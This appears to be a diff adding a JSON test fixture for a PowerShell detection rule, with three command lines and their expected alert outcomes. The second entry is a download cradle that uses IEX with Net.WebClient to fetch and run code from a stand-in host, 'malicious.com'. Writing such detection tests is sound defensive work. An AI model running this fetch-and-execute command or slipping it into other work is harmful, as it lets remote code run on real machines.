@@ -1,0 +1,17 @@
+[
+  {
+    "description": "Encoded command execution",
+    "CommandLine": "powershell.exe -enc aGVsbG8gd29ybGQ=",
+    "Expected": "Alert"
+  },
+  {
+    "description": "Download cradle",
+    "CommandLine": "powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://malicious.com')",
+    "Expected": "Alert"
+  },
+  {
+    "description": "Legitimate script",
+    "CommandLine": "powershell.exe -File backup.ps1",
+    "Expected": "No Alert"
+  }
+]
